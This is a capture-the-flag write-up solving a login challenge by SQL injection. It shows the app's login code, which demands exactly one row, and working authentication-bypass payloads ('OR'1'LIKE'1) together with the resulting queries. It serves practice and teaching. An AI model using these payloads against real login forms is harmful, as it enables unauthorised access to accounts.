# Login as User #2

With login page https://chal49-dsds35.vercel.app login as a valid user

# Solution

Obviously SQL injection with limits..

I was trying this payload but it wasn't working (even though within my local environment it was)

```json
{
	"user": "aaaa",
	"password": "'OR'1'LIKE'1'-- "
}
```

So the server side query would become:

```sql
SELECT userName, password, type, firstName, lastName FROM all_users
  WHERE userName = 'aaaa' and password = ''OR'1'LIKE'1'-- ' limit 1
```

Then I noticed this condition (which I was overlooking) within the `login` function:

```js
const login = async (userName, password) => {
	const rows = await getUser(userName, password);
	// THIS CONDITION!
	if (rows.length === 1) {
	//^^^^^^^^^^^^^^^^^^^^^^^^^^^
		return { message: "successfully logged on", type: rows[0].type, firstName: rows[0].firstName, lastName: rows[0].lastName, userName: rows[0].userName, status: "success" };
	}

	return { message: "Invalid username or password", status: "failed" };
};
```

This means my query, which was commenting out the `limit 1` part of the SQL query, was obviously returning more than 1 entry..

Modifying my query to the following worked:

```
{
  "user": "aaaa",
  "password": "'OR'1'LIKE'1" // <- leave the -- off as well as leave the last ' off
}
```

So the server side query becomes:

```sql
SELECT userName, password, type, firstName, lastName FROM all_users
  WHERE userName = 'aaaa' and password = ''OR'1'LIKE'1' limit 1
```

This allows the `limit 1` to remain and therefore hits the condition within `login` function.
